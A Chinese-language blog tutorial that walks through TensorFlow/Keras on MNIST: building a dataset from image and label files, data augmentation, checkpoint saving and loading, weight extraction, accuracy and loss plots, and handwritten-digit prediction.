<h1 id="自制数据集，解决本领域应用"><a href="#自制数据集，解决本领域应用" class="headerlink" title="自制数据集，解决本领域应用"></a>自制数据集，解决本领域应用</h1><h2 id="观察数据集结果，形成特征标签对"><a href="#观察数据集结果，形成特征标签对" class="headerlink" title="观察数据集结果，形成特征标签对"></a>观察数据集结果，形成特征标签对</h2><blockquote>
<p>一个完备的、可以用于神经网络训练的数据集必须包含特征、标签对。其中特征用于输入和计算结果，标签用于计算loss从而进行参数优化。</p>
</blockquote>
<p>我们这里准备了一份数据集，接下来将使用一个示例演示如何导入尚未封装的数据集。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074875541.png"></p>
<p>其实就是MNIST数据集，不过需要我们自己进行配对。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074875543.png"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074875540.png"></p>
<p>可见，x文件夹里是一张张图片，而y文件夹里是一行行数据对，将每一张图片与其表示的数字对应。</p>
<p>下面是导入代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">train_path = <span class="string">&#x27;./mnist_image_label/mnist_train_jpg_60000/&#x27;</span></span><br><span class="line">train_txt = <span class="string">&#x27;./mnist_image_label/mnist_train_jpg_60000.txt&#x27;</span></span><br><span class="line">x_train_savepath = <span class="string">&#x27;./mnist_image_label/mnist_x_train.npy&#x27;</span></span><br><span class="line">y_train_savepath = <span class="string">&#x27;./mnist_image_label/mnist_y_train.npy&#x27;</span></span><br><span class="line"></span><br><span class="line">test_path = <span class="string">&#x27;./mnist_image_label/mnist_test_jpg_10000/&#x27;</span></span><br><span class="line">test_txt = <span class="string">&#x27;./mnist_image_label/mnist_test_jpg_10000.txt&#x27;</span></span><br><span class="line">x_test_savepath = <span class="string">&#x27;./mnist_image_label/mnist_x_test.npy&#x27;</span></span><br><span class="line">y_test_savepath = <span class="string">&#x27;./mnist_image_label/mnist_y_test.npy&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generateds</span>(<span class="params">path, txt</span>):</span><br><span class="line">    f = <span class="built_in">open</span>(txt, <span class="string">&#x27;r&#x27;</span>)  <span class="comment"># 以只读形式打开txt文件</span></span><br><span class="line">    contents = f.readlines()  <span class="comment"># 读取文件中所有行</span></span><br><span class="line">    f.close()  <span class="comment"># 关闭txt文件</span></span><br><span class="line">    x, y_ = [], []  <span class="comment"># 建立空列表</span></span><br><span class="line">    <span class="keyword">for</span> content <span class="keyword">in</span> contents:  <span class="comment"># 逐行取出</span></span><br><span class="line">        value = content.split()  <span class="comment"># 以空格分开，图片路径为value[0] , 标签为value[1] , 存入列表</span></span><br><span class="line">        img_path = path + value[<span class="number">0</span>]  <span class="comment"># 拼出图片路径和文件名</span></span><br><span class="line">        img = Image.<span class="built_in">open</span>(img_path)  <span class="comment"># 读入图片</span></span><br><span class="line">        img = np.array(img.convert(<span class="string">&#x27;L&#x27;</span>))  <span class="comment"># 图片变为8位宽灰度值的np.array格式</span></span><br><span class="line">        img = img / <span class="number">255.</span>  <span class="comment"># 数据归一化 （实现预处理）</span></span><br><span class="line">        x.append(img)  <span class="comment"># 归一化后的数据，贴到列表x</span></span><br><span class="line">        y_.append(value[<span class="number">1</span>])  <span class="comment"># 标签贴到列表y_</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;loading : &#x27;</span> + content)  <span class="comment"># 打印状态提示</span></span><br><span class="line"></span><br><span class="line">    x = np.array(x)  <span class="comment"># 变为np.array格式</span></span><br><span class="line">    y_ = np.array(y_)  <span class="comment"># 变为np.array格式</span></span><br><span class="line">    y_ = y_.astype(np.int64)  <span class="comment"># 变为64位整型</span></span><br><span class="line">    <span class="keyword">return</span> x, y_  <span class="comment"># 返回输入特征x，返回标签y_</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> os.path.exists(x_train_savepath) <span class="keyword">and</span> os.path.exists(y_train_savepath) <span class="keyword">and</span> os.path.exists(</span><br><span class="line">        x_test_savepath) <span class="keyword">and</span> os.path.exists(y_test_savepath):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;-------------Load Datasets-----------------&#x27;</span>)</span><br><span class="line">    x_train_save = np.load(x_train_savepath)</span><br><span class="line">    y_train = np.load(y_train_savepath)</span><br><span class="line">    x_test_save = np.load(x_test_savepath)</span><br><span class="line">    y_test = np.load(y_test_savepath)</span><br><span class="line">    x_train = np.reshape(x_train_save, (<span class="built_in">len</span>(x_train_save), <span class="number">28</span>, <span class="number">28</span>))</span><br><span class="line">    x_test = np.reshape(x_test_save, (<span class="built_in">len</span>(x_test_save), <span class="number">28</span>, <span class="number">28</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;-------------Generate Datasets-----------------&#x27;</span>)</span><br><span class="line">    x_train, y_train = generateds(train_path, train_txt)</span><br><span class="line">    x_test, y_test = generateds(test_path, test_txt)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;-------------Save Datasets-----------------&#x27;</span>)</span><br><span class="line">    x_train_save = np.reshape(x_train, (<span class="built_in">len</span>(x_train), -<span class="number">1</span>))</span><br><span class="line">    x_test_save = np.reshape(x_test, (<span class="built_in">len</span>(x_test), -<span class="number">1</span>))</span><br><span class="line">    np.save(x_train_savepath, x_train_save)</span><br><span class="line">    np.save(y_train_savepath, y_train)</span><br><span class="line">    np.save(x_test_savepath, x_test_save)</span><br><span class="line">    np.save(y_test_savepath, y_test)</span><br><span class="line"></span><br><span class="line">model = tf.keras.models.Sequential([</span><br><span class="line">    tf.keras.layers.Flatten(),</span><br><span class="line">    tf.keras.layers.Dense(<span class="number">128</span>, activation=<span class="string">&#x27;relu&#x27;</span>),</span><br><span class="line">    tf.keras.layers.Dense(<span class="number">10</span>, activation=<span class="string">&#x27;softmax&#x27;</span>)</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">model.<span class="built_in">compile</span>(optimizer=<span class="string">&#x27;adam&#x27;</span>,</span><br><span class="line">              loss=tf.keras.losses.SparseCategoricalCrossentropy(from_logits=<span class="literal">False</span>),</span><br><span class="line">              metrics=[<span class="string">&#x27;sparse_categorical_accuracy&#x27;</span>])</span><br><span class="line"></span><br><span class="line">model.fit(x_train, y_train, batch_size=<span class="number">32</span>, epochs=<span class="number">5</span>, validation_data=(x_test, y_test), validation_freq=<span class="number">1</span>)</span><br><span class="line">model.summary()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>具体解释一下增加的部分代码：</p>
<blockquote>
<p>导入模块部分：</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> os</span><br></pre></td></tr></table></figure>
<p>使用了以上四个模块。</p>
<ul>
<li><strong>PIL</strong>是python的图像处理库，这里使用库里的Image类，进行图片的加载。</li>
<li><strong>os</strong>是“operating system”的缩写，提供的就是各种 Python 程序与操作系统进行交互的接口。这里使用的<br><code>os.path.exists()</code>用于判断指向的文件是否存在。</li>
<li><strong>Numpy</strong>是python用于科学计算的基础软件包，这里主要用于文本的加载、保存和矩阵的转换。</li>
</ul>
<p>注：在python学习模块会有专门的一个文章整理这些模块的用法，这里只需要知道使用到的函数的作用即可。</p>
<hr>
<blockquote>
<p>文件路径部分</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">train_path = <span class="string">&#x27;./mnist_image_label/mnist_train_jpg_60000/&#x27;</span></span><br><span class="line">train_txt = <span class="string">&#x27;./mnist_image_label/mnist_train_jpg_60000.txt&#x27;</span></span><br><span class="line">x_train_savepath = <span class="string">&#x27;./mnist_image_label/mnist_x_train.npy&#x27;</span></span><br><span class="line">y_train_savepath = <span class="string">&#x27;./mnist_image_label/mnist_y_train.npy&#x27;</span></span><br><span class="line"></span><br><span class="line">test_path = <span class="string">&#x27;./mnist_image_label/mnist_test_jpg_10000/&#x27;</span></span><br><span class="line">test_txt = <span class="string">&#x27;./mnist_image_label/mnist_test_jpg_10000.txt&#x27;</span></span><br><span class="line">x_test_savepath = <span class="string">&#x27;./mnist_image_label/mnist_x_test.npy&#x27;</span></span><br><span class="line">y_test_savepath = <span class="string">&#x27;./mnist_image_label/mnist_y_test.npy&#x27;</span></span><br></pre></td></tr></table></figure>
<p>这里指定了文件的地址，其中图片是只有所在文件夹的地址，后面会组合成具体图片的地址。<br>而<code>savepath</code>则是用于保存已经匹配好的数据集。</p>
<hr>
<blockquote>
<p>generateds()函数：</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">generateds</span>(<span class="params">path, txt</span>):</span><br><span class="line">    f = <span class="built_in">open</span>(txt, <span class="string">&#x27;r&#x27;</span>)  <span class="comment"># 以只读形式打开txt文件</span></span><br><span class="line">    contents = f.readlines()  <span class="comment"># 读取文件中所有行</span></span><br><span class="line">    f.close()  <span class="comment"># 关闭txt文件</span></span><br><span class="line">    x, y_ = [], []  <span class="comment"># 建立空列表</span></span><br><span class="line">    <span class="keyword">for</span> content <span class="keyword">in</span> contents:  <span class="comment"># 逐行取出</span></span><br><span class="line">        value = content.split()  <span class="comment"># 以空格分开，图片路径为value[0] , 标签为value[1] , 存入列表</span></span><br><span class="line">        img_path = path + value[<span class="number">0</span>]  <span class="comment"># 拼出图片路径和文件名</span></span><br><span class="line">        img = Image.<span class="built_in">open</span>(img_path)  <span class="comment"># 读入图片</span></span><br><span class="line">        img = np.array(img.convert(<span class="string">&#x27;L&#x27;</span>))  <span class="comment"># 图片变为8位宽灰度值的np.array格式</span></span><br><span class="line">        img = img / <span class="number">255.</span>  <span class="comment"># 数据归一化 （实现预处理）</span></span><br><span class="line">        x.append(img)  <span class="comment"># 归一化后的数据，贴到列表x</span></span><br><span class="line">        y_.append(value[<span class="number">1</span>])  <span class="comment"># 标签贴到列表y_</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;loading : &#x27;</span> + content)  <span class="comment"># 打印状态提示</span></span><br><span class="line"></span><br><span class="line">    x = np.array(x)  <span class="comment"># 变为np.array格式</span></span><br><span class="line">    y_ = np.array(y_)  <span class="comment"># 变为np.array格式</span></span><br><span class="line">    y_ = y_.astype(np.int64)  <span class="comment"># 变为64位整型</span></span><br><span class="line">    <span class="keyword">return</span> x, y_  <span class="comment"># 返回输入特征x，返回标签y_</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>此函数用于读取图片，将其转换为灰度值的二维矩阵，而后存储在列表之中。<br>在转换的过程中，会进行数据与标签的匹配。</p>
<hr>
<blockquote>
<p>os判断部分：</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> os.path.exists(x_train_savepath) <span class="keyword">and</span> os.path.exists(y_train_savepath) <span class="keyword">and</span> os.path.exists(</span><br><span class="line">        x_test_savepath) <span class="keyword">and</span> os.path.exists(y_test_savepath):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;-------------Load Datasets-----------------&#x27;</span>)</span><br><span class="line">    x_train_save = np.load(x_train_savepath)</span><br><span class="line">    y_train = np.load(y_train_savepath)</span><br><span class="line">    x_test_save = np.load(x_test_savepath)</span><br><span class="line">    y_test = np.load(y_test_savepath)</span><br><span class="line">    x_train = np.reshape(x_train_save, (<span class="built_in">len</span>(x_train_save), <span class="number">28</span>, <span class="number">28</span>))</span><br><span class="line">    x_test = np.reshape(x_test_save, (<span class="built_in">len</span>(x_test_save), <span class="number">28</span>, <span class="number">28</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;-------------Generate Datasets-----------------&#x27;</span>)</span><br><span class="line">    x_train, y_train = generateds(train_path, train_txt)</span><br><span class="line">    x_test, y_test = generateds(test_path, test_txt)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;-------------Save Datasets-----------------&#x27;</span>)</span><br><span class="line">    x_train_save = np.reshape(x_train, (<span class="built_in">len</span>(x_train), -<span class="number">1</span>))</span><br><span class="line">    x_test_save = np.reshape(x_test, (<span class="built_in">len</span>(x_test), -<span class="number">1</span>))</span><br><span class="line">    np.save(x_train_savepath, x_train_save)</span><br><span class="line">    np.save(y_train_savepath, y_train)</span><br><span class="line">    np.save(x_test_savepath, x_test_save)</span><br><span class="line">    np.save(y_test_savepath, y_test)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里主要是进行判断，即是否已经运行过代码，生成了数据。可以加载已经保存的数据，不用再进行读入匹配。</p>
<h3 id="我的收获"><a href="#我的收获" class="headerlink" title="我的收获"></a>我的收获</h3><p>在进行深度学习的过程中，很多数据集是没有内置的，我们需要自制数据集。一般来说，自制数据集都是将数据转换为可以进行模型读入的形式，这里<code>Numpy</code>很重要，需要加大学习深度与灵活应用。</p>
<p>上面的例子是一个很好的参考，以后进行实践的时候可以参考这个进行数据集的搭建。</p>
<h1 id="数据增强，扩充数据集"><a href="#数据增强，扩充数据集" class="headerlink" title="数据增强，扩充数据集"></a>数据增强，扩充数据集</h1><blockquote>
<p>这个部分主要是对数据进行预处理，对数据集进行某些操作以减少其噪音干扰，提高准确率。<br>不同的数据集需要进行不同的预处理，这里主要是针对MNIST数据集进行演示。</p>
</blockquote>
<p>代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"><span class="keyword">from</span> tensorflow.keras.preprocessing.image <span class="keyword">import</span> ImageDataGenerator</span><br><span class="line"></span><br><span class="line">mnist = tf.keras.datasets.mnist</span><br><span class="line">(x_train, y_train), (x_test, y_test) = mnist.load_data()</span><br><span class="line">x_train, x_test = x_train / <span class="number">255.0</span>, x_test / <span class="number">255.0</span></span><br><span class="line">x_train = x_train.reshape(x_train.shape[<span class="number">0</span>], <span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>)  <span class="comment"># 给数据增加一个维度,从(60000, 28, 28)reshape为(60000, 28, 28, 1)</span></span><br><span class="line"></span><br><span class="line">image_gen_train = ImageDataGenerator(</span><br><span class="line">    rescale=<span class="number">1.</span> / <span class="number">1.</span>,  <span class="comment"># 如为图像，分母为255时，可归至0～1</span></span><br><span class="line">    rotation_range=<span class="number">45</span>,  <span class="comment"># 随机45度旋转</span></span><br><span class="line">    width_shift_range=<span class="number">.15</span>,  <span class="comment"># 宽度偏移</span></span><br><span class="line">    height_shift_range=<span class="number">.15</span>,  <span class="comment"># 高度偏移</span></span><br><span class="line">    horizontal_flip=<span class="literal">False</span>,  <span class="comment"># 水平翻转</span></span><br><span class="line">    zoom_range=<span class="number">0.5</span>  <span class="comment"># 将图像随机缩放阈量50％</span></span><br><span class="line">)</span><br><span class="line">image_gen_train.fit(x_train)</span><br><span class="line"></span><br><span class="line">model = tf.keras.models.Sequential([</span><br><span class="line">    tf.keras.layers.Flatten(),</span><br><span class="line">    tf.keras.layers.Dense(<span class="number">128</span>, activation=<span class="string">&#x27;relu&#x27;</span>),</span><br><span class="line">    tf.keras.layers.Dense(<span class="number">10</span>, activation=<span class="string">&#x27;softmax&#x27;</span>)</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">model.<span class="built_in">compile</span>(optimizer=<span class="string">&#x27;adam&#x27;</span>,</span><br><span class="line">              loss=tf.keras.losses.SparseCategoricalCrossentropy(from_logits=<span class="literal">False</span>),</span><br><span class="line">              metrics=[<span class="string">&#x27;sparse_categorical_accuracy&#x27;</span>])</span><br><span class="line"></span><br><span class="line">model.fit(image_gen_train.flow(x_train, y_train, batch_size=<span class="number">32</span>), epochs=<span class="number">5</span>, validation_data=(x_test, y_test),</span><br><span class="line">          validation_freq=<span class="number">1</span>)</span><br><span class="line">model.summary()</span><br></pre></td></tr></table></figure>

<p>因为是局限于MNIST数据集，这里不再进行介绍。</p>
<h1 id="断点续训，存取模型"><a href="#断点续训，存取模型" class="headerlink" title="断点续训，存取模型"></a>断点续训，存取模型</h1><blockquote>
<p>我们在进行完模型的训练与优化之后，就要进行模型的保存，这样在进行数据的预测时就可以直接调用保存的模型即可。</p>
</blockquote>
<p>在keras中给出了模型读取和保存的函数，我们接下来进行演示。</p>
<h2 id="模型的读取"><a href="#模型的读取" class="headerlink" title="模型的读取"></a>模型的读取</h2><blockquote>
<p>使用<code>load_weights(路径名)</code>进行模型的读取</p>
</blockquote>
<p><strong>代码如下</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">checkpoint_save_path = <span class="string">&quot;./checkpoint/mnist.ckpt&quot;</span></span><br><span class="line"><span class="keyword">if</span> os.path.exists(checkpoint_save_path + <span class="string">&#x27;.index&#x27;</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;-------------load the model-----------------&#x27;</span>)</span><br><span class="line">    model.load_weights(checkpoint_save_path)</span><br></pre></td></tr></table></figure>
<p><strong>具体介绍</strong>：</p>
<ul>
<li>先定义好模型的存储地址（ckpt文件）</li>
<li>再通过<code>os.path.exists()</code>判断是否有保存的模型（在文件保存时会同步生成索引表，通过index进行判断）</li>
<li>使用<code>model.load.weights()</code>进行模型参数的读取（model为前面定义好的空模型）</li>
</ul>
<h2 id="模型的保存"><a href="#模型的保存" class="headerlink" title="模型的保存"></a>模型的保存</h2><p>使用TensorFlow提供的<strong>回调函数</strong>进行保存。</p>
<p><strong>代码如下</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cp_callback = tf.keras.callbacks.ModelCheckpoint(filepath=checkpoint_save_path,</span><br><span class="line">                                                 save_weights_only=<span class="literal">True</span>,</span><br><span class="line">                                                 save_best_only=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">history = model.fit(x_train, y_train, batch_size=<span class="number">32</span>, epochs=<span class="number">5</span>, validation_data=(x_test, y_test), validation_freq=<span class="number">1</span>,</span><br><span class="line">                    callbacks=[cp_callback])</span><br></pre></td></tr></table></figure>
<p><strong>具体介绍</strong>：</p>
<ul>
<li>在<code>tf.keras.callbacks.ModelCheckpoint（）</code>告知<strong>文件存储路径</strong>、是否只<strong>保存模型参数</strong>，是否只<strong>保存最优值</strong>。</li>
<li>在执行训练过程时加入<code>callbacks选项</code>，记录到history中</li>
</ul>
<hr>
<p><strong>完整代码如下</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">mnist = tf.keras.datasets.mnist</span><br><span class="line">(x_train, y_train), (x_test, y_test) = mnist.load_data()</span><br><span class="line">x_train, x_test = x_train / <span class="number">255.0</span>, x_test / <span class="number">255.0</span></span><br><span class="line"></span><br><span class="line">model = tf.keras.models.Sequential([</span><br><span class="line">    tf.keras.layers.Flatten(),</span><br><span class="line">    tf.keras.layers.Dense(<span class="number">128</span>, activation=<span class="string">&#x27;relu&#x27;</span>),</span><br><span class="line">    tf.keras.layers.Dense(<span class="number">10</span>, activation=<span class="string">&#x27;softmax&#x27;</span>)</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">model.<span class="built_in">compile</span>(optimizer=<span class="string">&#x27;adam&#x27;</span>,</span><br><span class="line">              loss=tf.keras.losses.SparseCategoricalCrossentropy(from_logits=<span class="literal">False</span>),</span><br><span class="line">              metrics=[<span class="string">&#x27;sparse_categorical_accuracy&#x27;</span>])</span><br><span class="line"></span><br><span class="line">checkpoint_save_path = <span class="string">&quot;./checkpoint/mnist.ckpt&quot;</span></span><br><span class="line"><span class="keyword">if</span> os.path.exists(checkpoint_save_path + <span class="string">&#x27;.index&#x27;</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;-------------load the model-----------------&#x27;</span>)</span><br><span class="line">    model.load_weights(checkpoint_save_path)</span><br><span class="line"></span><br><span class="line">cp_callback = tf.keras.callbacks.ModelCheckpoint(filepath=checkpoint_save_path,</span><br><span class="line">                                                 save_weights_only=<span class="literal">True</span>,</span><br><span class="line">                                                 save_best_only=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">history = model.fit(x_train, y_train, batch_size=<span class="number">32</span>, epochs=<span class="number">5</span>, validation_data=(x_test, y_test), validation_freq=<span class="number">1</span>,</span><br><span class="line">                    callbacks=[cp_callback])</span><br><span class="line">model.summary()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>运行结果</strong>：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074875518.png" alt="运行结果"></p>
<p>可以在文件夹里看见保存的模型。再次运行代码，会在已有模型的基础上进行训练。</p>
<h1 id="参数提取"><a href="#参数提取" class="headerlink" title="参数提取"></a>参数提取</h1><blockquote>
<p> 本节学习如何将保存模型的参数提取出来，变成可以量化的文本形式。</p>
</blockquote>
<ol>
<li>提取可训练参数</li>
</ol>
<p><code>model.trainable_variables</code> 返回模型中可训练的参数</p>
<ol start="2">
<li>打印参数</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">np.set_printoptions(threshold=np.inf)</span><br><span class="line"><span class="built_in">print</span>(model.trainable_variables)</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;./weights.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> v <span class="keyword">in</span> model.trainable_variables:</span><br><span class="line">    file.write(<span class="built_in">str</span>(v.name) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    file.write(<span class="built_in">str</span>(v.shape) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    file.write(<span class="built_in">str</span>(v.numpy()) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">file.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>p.set_printoptions</code>(precision&#x3D;小数点后按四舍五入保留几位,threshold&#x3D;数组元素数量少于或等于门槛值，打印全部元素；否则打印门槛值+1 个元素，中间用省略号补充)<br>这里使用<code>np.set_printoptions(threshold=np.inf)</code>表示打印所有的元素。</p>
<p><strong>运行结果</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074875521.png" alt="result"></p>
<p>在文件夹里看到生成的weight.txt文件，其中可以看到保存的参数。</p>
<h1 id="Acc与loss可视化"><a href="#Acc与loss可视化" class="headerlink" title="Acc与loss可视化"></a>Acc与loss可视化</h1><blockquote>
<p>其实在进行fit时，已经实时记录了我们所需的参数，我们只需要读取并使用模块画出即可。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">acc = history.history[<span class="string">&#x27;sparse_categorical_accuracy&#x27;</span>]</span><br><span class="line">val_acc = history.history[<span class="string">&#x27;val_sparse_categorical_accuracy&#x27;</span>]</span><br><span class="line">loss = history.history[<span class="string">&#x27;loss&#x27;</span>]</span><br><span class="line">val_loss = history.history[<span class="string">&#x27;val_loss&#x27;</span>]</span><br><span class="line"></span><br><span class="line">plt.subplot(<span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">plt.plot(acc, label=<span class="string">&#x27;Training Accuracy&#x27;</span>)</span><br><span class="line">plt.plot(val_acc, label=<span class="string">&#x27;Validation Accuracy&#x27;</span>)</span><br><span class="line">plt.title(<span class="string">&#x27;Training and Validation Accuracy&#x27;</span>)</span><br><span class="line">plt.legend()</span><br><span class="line"></span><br><span class="line">plt.subplot(<span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>)</span><br><span class="line">plt.plot(loss, label=<span class="string">&#x27;Training Loss&#x27;</span>)</span><br><span class="line">plt.plot(val_loss, label=<span class="string">&#x27;Validation Loss&#x27;</span>)</span><br><span class="line">plt.title(<span class="string">&#x27;Training and Validation Loss&#x27;</span>)</span><br><span class="line">plt.legend()</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<p>以上代码就是读取保存的数据，再使用plt模型进行图像绘制的过程。<br>其中：</p>
<ul>
<li>训练集loss： loss</li>
<li>测试集loss： val_loss</li>
<li>训练集准确率： sparse_categorical_accuracy</li>
<li>测试集准确率： val_sparse_categorical_accuracy</li>
</ul>
<p>而关于plt的使用在python的学习中会进行整理。<br>这里我们来看一下运行结果：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074875522.png" alt="曲线1 2"></p>
<h1 id="实际应用：绘图识字"><a href="#实际应用：绘图识字" class="headerlink" title="实际应用：绘图识字"></a>实际应用：绘图识字</h1><blockquote>
<p>我们前面的一系列操作就是为了提供已有的数据集将我们的神经网络训练完成，得到一套可以成功识别的参数。下面我们要进行实际的测试，即使用我们已经训练好的模型进行手写数字的识别。</p>
</blockquote>
<p>大体流程如下：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074875519.png"></p>
<p>前两个部分已经介绍过，这里我们主要介绍一些第三个部分，即图片的读取与预处理。</p>
<p>先给出代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"></span><br><span class="line">model_save_path = <span class="string">&#x27;./checkpoint/mnist.ckpt&#x27;</span></span><br><span class="line"></span><br><span class="line">model = tf.keras.models.Sequential([</span><br><span class="line">    tf.keras.layers.Flatten(),</span><br><span class="line">    tf.keras.layers.Dense(<span class="number">128</span>, activation=<span class="string">&#x27;relu&#x27;</span>),</span><br><span class="line">    tf.keras.layers.Dense(<span class="number">10</span>, activation=<span class="string">&#x27;softmax&#x27;</span>)])</span><br><span class="line"></span><br><span class="line">model.load_weights(model_save_path)</span><br><span class="line"></span><br><span class="line">preNum = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;input the number of test pictures:&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(preNum):</span><br><span class="line">    image_path = <span class="built_in">input</span>(<span class="string">&quot;the path of test picture:&quot;</span>)</span><br><span class="line">    img = Image.<span class="built_in">open</span>(image_path)</span><br><span class="line">    img = img.resize((<span class="number">28</span>, <span class="number">28</span>), Image.ANTIALIAS)</span><br><span class="line">    img_arr = np.array(img.convert(<span class="string">&#x27;L&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">28</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">28</span>):</span><br><span class="line">            <span class="keyword">if</span> img_arr[i][j] &lt; <span class="number">200</span>:</span><br><span class="line">                img_arr[i][j] = <span class="number">255</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                img_arr[i][j] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    img_arr = img_arr / <span class="number">255.0</span></span><br><span class="line">    x_predict = img_arr[tf.newaxis, ...]</span><br><span class="line">    result = model.predict(x_predict)</span><br><span class="line"></span><br><span class="line">    pred = tf.argmax(result, axis=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    tf.<span class="built_in">print</span>(pred)</span><br></pre></td></tr></table></figure>

<p>有几个需要注意的地方：</p>
<ol>
<li>通过Image模块进行图片的读取。在读取的时候要进行图片长宽的变化： <code>img = img.resize((28, 28), Image.ANTIALIAS)</code></li>
<li>我们需要的是黑底白字的图片，所以要在读取前进行灰度值的改变。<br>这里对这个二维数组进行了遍历，把小于200的灰度值变成255，其余变成了0，使得图片的对比度提高。</li>
<li>在输入神经网络前还要进行归一化，和矩阵维数的变化，变成1x28x28的三维矩阵。</li>
<li>使用<code>tf.argmax(result, axis=1)</code>获取最大值下标为结果。</li>
</ol>
<p><strong>识别结果</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649074875520.png"></p>
<hr>
<blockquote>
<p>写在最后：</p>
</blockquote>
<p>至此，有关TensorFlow的基本知识已经完成，对一个全连接神经网络的建立与训练也已经有了一个规范化的模式。可以说关于深度学习的树干已经树立好了，接下来就是为其添枝加叶，开花结果。</p>
